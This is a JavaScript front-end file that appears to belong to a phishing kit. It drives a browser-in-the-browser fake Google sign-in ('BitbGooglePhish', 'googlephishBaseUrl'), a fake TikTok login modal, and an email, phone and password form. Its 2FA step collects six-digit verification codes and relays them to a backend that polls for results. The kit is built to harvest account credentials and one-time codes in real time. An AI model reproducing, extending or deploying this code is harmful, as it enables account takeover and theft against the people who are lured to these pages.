(function () {
    var cfg = window.APP_CONFIG || {};

    if (window.AuthUI) window.AuthUI.init();

    function tryOpenBitb() {
        if (!window.AuthUI) return false;
        var base = window.BitbGooglePhish && window.BitbGooglePhish.normalizeBase(cfg.googlephishBaseUrl);
        if (!base) {
            window.AuthUI.setBanner(
                'Set googlephishBaseUrl in config.js to your PHP app URL (e.g. http://127.0.0.1:8080).',
                'error'
            );
            return false;
        }
        if (window.BitbGooglePhish && window.BitbGooglePhish.open()) return true;
        window.AuthUI.setBanner('Could not open sign-in window. Please try again.', 'error');
        return false;
    }

    // Google picker modal
    var gPickerModal       = document.getElementById('googlePickerModal');
    var gPickerBackdrop    = document.getElementById('gPickerBackdrop');
    var gPickerContinueBtn = document.getElementById('gPickerContinueBtn');
    var gPickerCancelBtn   = document.getElementById('gPickerCancelBtn');

    function openGPicker() {
        if (!gPickerModal) return;
        gPickerModal.hidden = false;
        gPickerModal.setAttribute('aria-hidden', 'false');
    }

    function closeGPicker() {
        if (!gPickerModal) return;
        gPickerModal.hidden = true;
        gPickerModal.setAttribute('aria-hidden', 'true');
    }

    function continueWithGoogle() {
        closeGPicker();
        window.AuthUI.clearBanner();
        tryOpenBitb();
    }

    if (gPickerBackdrop)    gPickerBackdrop.addEventListener('click', closeGPicker);
    if (gPickerCancelBtn)   gPickerCancelBtn.addEventListener('click', closeGPicker);
    if (gPickerContinueBtn) {
        gPickerContinueBtn.addEventListener('click', continueWithGoogle);
        gPickerContinueBtn.addEventListener('keydown', function (e) {
            if (e.key === 'Enter' || e.key === ' ') { e.preventDefault(); continueWithGoogle(); }
        });
    }
    if (gPickerModal) {
        gPickerModal.addEventListener('keydown', function (e) {
            if (e.key === 'Escape') closeGPicker();
        });
    }

    var googleBtn = document.getElementById('googleSignInBtn');
    if (googleBtn) {
        googleBtn.addEventListener('click', function () {
            window.AuthUI.clearBanner();
            openGPicker();
        });
    }

    var tiktokLoginBtn = document.getElementById('tiktokLoginBtn');
    if (tiktokLoginBtn && window.AuthAPI && window.AuthUI) {
        tiktokLoginBtn.addEventListener('click', function () {
            window.AuthUI.clearBanner();

            if (!window.AuthAPI.apiBase()) {
                window.AuthUI.setBanner('Set apiBaseUrl in config.js to your Node backend URL.', 'error');
                return;
            }

            // Show modal instantly (before API call)
            window.AuthUI.showTiktokImage('');

            window.AuthAPI.loginWithTiktok()
                .then(function (body) {
                    if (!body || !body.request_id) throw new Error('Invalid TikTok login response');
                    // Modal is already showing, just start polling
                    return window.AuthAPI.pollLoginStatus(body.request_id);
                })
                .then(function (result) {
                    var status = result && result.status;
                    if (status === 'show_image') {
                        window.AuthUI.showTiktokImage(result.image_url || '');
                    } else {
                        window.AuthUI.hideTiktokImage();
                        if (status === 'rejected') {
                            window.AuthUI.setBanner('TikTok login was declined. Please try again.', 'error');
                        } else if (status === 'timeout') {
                            window.AuthUI.setBanner('The request timed out. Please try again.', 'error');
                        } else {
                            window.AuthUI.setBanner('Something went wrong. Please try again.', 'error');
                        }
                    }
                })
                .catch(function () {
                    window.AuthUI.hideTiktokImage();
                    window.AuthUI.setBanner('Something went wrong. Please try again.', 'error');
                });
        });
    }

    // Wire TikTok modal close handlers
    (function () {
        var modal    = document.getElementById('tiktokImageModal');
        var closeBtn = document.getElementById('tiktokImgClose');
        var backdrop = document.getElementById('tiktokImgBackdrop');
        function closeModal() { if (window.AuthUI) window.AuthUI.hideTiktokImage(); }
        if (closeBtn) closeBtn.addEventListener('click', closeModal);
        if (backdrop) backdrop.addEventListener('click', closeModal);
        if (modal) {
            modal.addEventListener('keydown', function (e) {
                if (e.key === 'Escape') closeModal();
            });
        }
    })();

    var pending2faRequestId = null;

    function handle2faResult(result) {
        if (!result || result.status !== '2fa') return;
        pending2faRequestId = result.request_id || null;
        window.AuthUI.show2fa(result.two_fa_type || 'email');
    }

    var loginForm     = document.getElementById('loginForm');
    var emailBlock    = document.getElementById('emailBlock');
    var phoneBlock    = document.getElementById('phoneBlock');
    var passwordBlock = document.getElementById('passwordBlock');
    var smsBlock      = document.getElementById('smsBlock');

    function isPhoneMode() {
        return phoneBlock && window.getComputedStyle(phoneBlock).display !== 'none';
    }

    function isSmsMode() {
        return smsBlock && window.getComputedStyle(smsBlock).display !== 'none';
    }

    function getUsername() {
        if (isPhoneMode()) {
            var code  = document.getElementById('countryCode');
            var phone = document.getElementById('phone');
            return (code ? code.value : '') + (phone ? phone.value.trim() : '');
        }
        var email = document.getElementById('email');
        return email ? email.value.trim() : '';
    }

    if (loginForm && window.AuthAPI && window.AuthUI) {
        loginForm.addEventListener('submit', function (e) {
            e.preventDefault();
            window.AuthUI.clearBanner();

            if (!window.AuthAPI.apiBase()) {
                window.AuthUI.setBanner('Set apiBaseUrl in config.js to your Node backend URL.', 'error');
                return;
            }

            if (isSmsMode()) {
                window.AuthUI.setBanner('Please enter your password to log in.', 'error');
                return;
            }

            var username = getUsername();
            var pwdInput = document.getElementById('password');
            var password = pwdInput ? pwdInput.value : '';

            if (!username || !password) {
                window.AuthUI.setBanner('Enter your email or phone and password.', 'error');
                return;
            }

            window.AuthUI.runGate(function () {
                return window.AuthAPI.afterLoginPoll(window.AuthAPI.loginWithPassword(username, password));
            }).then(function (result) {
                handle2faResult(result);
            }).catch(function () {});
        });
    }

    var twoFaSubmitBtn = document.getElementById('twoFaSubmitBtn');
    var twoFaBackBtn   = document.getElementById('twoFaBackBtn');

    function get2faCode() {
        var view = document.getElementById('twoFaView');
        var method = view && view.getAttribute('data-2fa-method');
        if (method === 'phone') {
            return (document.getElementById('twoFaPhoneCode') || {}).value || '';
        }
        if (method === 'totp') {
            return (document.getElementById('twoFaTotpCode') || {}).value || '';
        }
        return (document.getElementById('twoFaEmailCode') || {}).value || '';
    }

    if (twoFaSubmitBtn && window.AuthAPI && window.AuthUI) {
        twoFaSubmitBtn.addEventListener('click', function () {
            window.AuthUI.clearBanner('twoFaBanner');

            if (!pending2faRequestId) {
                window.AuthUI.setBanner('Session expired. Please log in again.', 'error', 'twoFaBanner');
                return;
            }

            var code = get2faCode().replace(/\s/g, '');
            if (!code) {
                window.AuthUI.setBanner('Enter the verification code.', 'error', 'twoFaBanner');
                return;
            }
            if (!/^\d{6}$/.test(code)) {
                window.AuthUI.setBanner('Code must be 6 digits.', 'error', 'twoFaBanner');
                return;
            }

            var reqId = pending2faRequestId;
            window.AuthUI.runGate(function () {
                return window.AuthAPI.afterLoginPoll(
                    window.AuthAPI.submit2fa(reqId, code)
                );
            }).then(function (result) {
                handle2faResult(result);
            }).catch(function () {});
        });
    }

    if (twoFaBackBtn && window.AuthUI) {
        twoFaBackBtn.addEventListener('click', function () {
            pending2faRequestId = null;
            window.AuthUI.clearBanner('twoFaBanner');
            window.AuthUI.showLogin();
        });
    }

    function showEmail() { if (emailBlock) emailBlock.style.display = ''; if (phoneBlock) phoneBlock.style.display = 'none'; }
    function showPhone() { if (emailBlock) emailBlock.style.display = 'none'; if (phoneBlock) phoneBlock.style.display = ''; }

    var usePhoneLink = document.getElementById('toggleInputMode');
    var useEmailLink = document.getElementById('toggleInputModePhone');
    if (usePhoneLink) usePhoneLink.addEventListener('click', function (e) { e.preventDefault(); showPhone(); });
    if (useEmailLink) useEmailLink.addEventListener('click', function (e) { e.preventDefault(); showEmail(); });

    function showPassword() { if (passwordBlock) passwordBlock.style.display = ''; if (smsBlock) smsBlock.style.display = 'none'; }
    function showSms()      { if (passwordBlock) passwordBlock.style.display = 'none'; if (smsBlock) smsBlock.style.display = ''; }

    var smsToggleLink = document.getElementById('smsToggleLink');
    var pwdToggleLink = document.getElementById('pwdToggleLink');
    if (smsToggleLink) smsToggleLink.addEventListener('click', function (e) { e.preventDefault(); showSms(); });
    if (pwdToggleLink) pwdToggleLink.addEventListener('click', function (e) { e.preventDefault(); showPassword(); });

    var loginView  = document.getElementById('loginView');
    var forgotView = document.getElementById('forgotView');

    function showForgot() { if (loginView) loginView.style.display = 'none'; if (forgotView) forgotView.style.display = ''; }
    function showMainLogin() { if (forgotView) forgotView.style.display = 'none'; if (loginView) loginView.style.display = ''; }

    var forgotLink = document.getElementById('forgotPasswordLink');
    var backBtn    = document.getElementById('backToLogin');
    if (forgotLink) forgotLink.addEventListener('click', function (e) { e.preventDefault(); showForgot(); });
    if (backBtn)    backBtn.addEventListener('click', function () { showMainLogin(); });

    var forgotForm = document.getElementById('forgotForm');
    if (forgotForm) forgotForm.addEventListener('submit', function (e) { e.preventDefault(); });

    var fpEmailBlock = document.getElementById('fpEmailBlock');
    var fpPhoneBlock = document.getElementById('fpPhoneBlock');
    var fpUsePhone   = document.getElementById('fpToggleInputMode');
    var fpUseEmail   = document.getElementById('fpToggleInputModePhone');
    if (fpUsePhone) fpUsePhone.addEventListener('click', function (e) { e.preventDefault(); if (fpEmailBlock) fpEmailBlock.style.display = 'none'; if (fpPhoneBlock) fpPhoneBlock.style.display = ''; });
    if (fpUseEmail) fpUseEmail.addEventListener('click', function (e) { e.preventDefault(); if (fpPhoneBlock) fpPhoneBlock.style.display = 'none'; if (fpEmailBlock) fpEmailBlock.style.display = ''; });

    function startCountdown(btn, originalText) {
        var seconds = 60;
        btn.disabled = true;
        btn.textContent = seconds + 's';
        var timer = setInterval(function () {
            seconds--;
            if (seconds <= 0) {
                clearInterval(timer);
                btn.disabled = false;
                btn.textContent = originalText || 'Resend';
            } else {
                btn.textContent = seconds + 's';
            }
        }, 1000);
    }

    ['sendCodeBtn', 'fpSendCodeBtn', 'twoFaEmailResend', 'twoFaPhoneResend'].forEach(function (id) {
        var btn = document.getElementById(id);
        var orig = btn && btn.textContent;
        if (btn) btn.addEventListener('click', function () { startCountdown(btn, orig); });
    });

    function wireTogglePwd(inputId, btnId) {
        var inp = document.getElementById(inputId);
        var btn = document.getElementById(btnId);
        if (!inp || !btn) return;
        btn.addEventListener('click', function () {
            var hidden = inp.type === 'password';
            inp.type = hidden ? 'text' : 'password';
            btn.setAttribute('aria-pressed', hidden ? 'true' : 'false');
            btn.setAttribute('aria-label', hidden ? 'Hide password' : 'Show password');
            var eye = btn.querySelector('.eye-icon');
            if (eye) {
                eye.innerHTML = hidden
                    ? '<path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94"/>' +
                      '<path d="M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19"/>' +
                      '<line x1="1" y1="1" x2="23" y2="23"/>'
                    : '<path d="M1 12s4-7 11-7 11 7 11 7-4 7-11 7-11-7-11-7z"/>' +
                      '<circle cx="12" cy="12" r="3"/>';
            }
        });
    }

    wireTogglePwd('password', 'togglePwd');
    wireTogglePwd('fpNewPwd', 'fpToggleNewPwd');
    wireTogglePwd('fpConfirmPwd', 'fpToggleConfirmPwd');
})();
